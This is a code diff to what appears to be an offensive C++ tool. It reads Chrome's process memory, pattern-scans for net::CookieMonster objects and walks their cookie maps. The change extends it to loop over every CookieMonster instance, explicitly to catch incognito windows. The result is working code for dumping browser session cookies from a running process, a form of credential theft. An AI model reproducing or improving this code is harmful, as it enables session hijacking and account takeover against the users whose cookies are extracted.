@@ -103,6 +103,9 @@ int main(int argc, char* argv[]) {
     LPCWSTR dllName;
     size_t szPattern = 0;
     //0xAA is a wild card that matches any byte
+    //Pattern is the implementation of the function net::CookieMonster::~CookieMonster(void)
+    //We use that to find the contents of Virtual Function Pointer struct (__vfptr)
+    //Each instance of CookieMonster comes with one
     BYTE* pattern;
     if (chrome)
     {
@@ -203,24 +206,37 @@ int main(int argc, char* argv[]) {
     BYTE thirdPattern[sizeof(uintptr_t)];
     ConvertToByteArray(resultAddress, thirdPattern, sizeof(uintptr_t));
 
-    if (!FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), resultAddress)) {
+    uintptr_t* CookieMonsterInstances = (uintptr_t*)malloc(sizeof(uintptr_t)*100); //There is no person with computer RAM enough to run more than 100 chrome instances :D
+    size_t szCookieMonster = 0;
+    if (CookieMonsterInstances == NULL || !FindPattern(hChrome, thirdPattern, sizeof(uintptr_t), CookieMonsterInstances, szCookieMonster)) {
         printf("[-] Failed to find the third pattern!\n");
         CloseHandle(hChrome);
+        free(CookieMonsterInstances);
         return 1;
     }
 #ifdef _DEBUG
-    wprintf(TEXT("[*] Found third pattern on 0x%p\n"), (void*)resultAddress);
+    wprintf(TEXT("[*] Found %zu instances of CookieMonster!\n"), szCookieMonster);
+
+    for (size_t i = 0; i < szCookieMonster; i++)
+        wprintf(TEXT("[*] Found CookieMonster on 0x%p\n"), (void*)CookieMonsterInstances[i]);
 #endif
 
-    uintptr_t CookieMapOffset = 0x28;
-    CookieMapOffset += resultAddress + sizeof(uintptr_t); //Include the length of the result address as well
-
+    //I don't know that the first instance of the CookieMonster is supposed to be, but the CookieMap for it seems to always be empty
+    //Each incognito window will have their own instance of the CookieMonster, and that is why we need to find and loop them all
+    for (size_t i = 1; i < szCookieMonster; i++)
+    {
+        if (CookieMonsterInstances == NULL || CookieMonsterInstances[i] == NULL)
+            break;
+        uintptr_t CookieMapOffset = 0x28; //This offset is fixed since the data just is there like it is
+        CookieMapOffset += CookieMonsterInstances[i] + sizeof(uintptr_t); //Include the length of the result address as well
 #ifdef _DEBUG
-    wprintf(TEXT("[*] CookieMap should be found in address 0x%p\n"), (void*)CookieMapOffset);
+        wprintf(TEXT("[*] CookieMap should be found in address 0x%p\n"), (void*)CookieMapOffset);
 #endif
-    WalkCookieMap(hChrome, CookieMapOffset);
+        WalkCookieMap(hChrome, CookieMapOffset);
+    }
 
     CloseHandle(hChrome);
+    free(CookieMonsterInstances);
 
     printf("[+] Done\n");
     return 0;
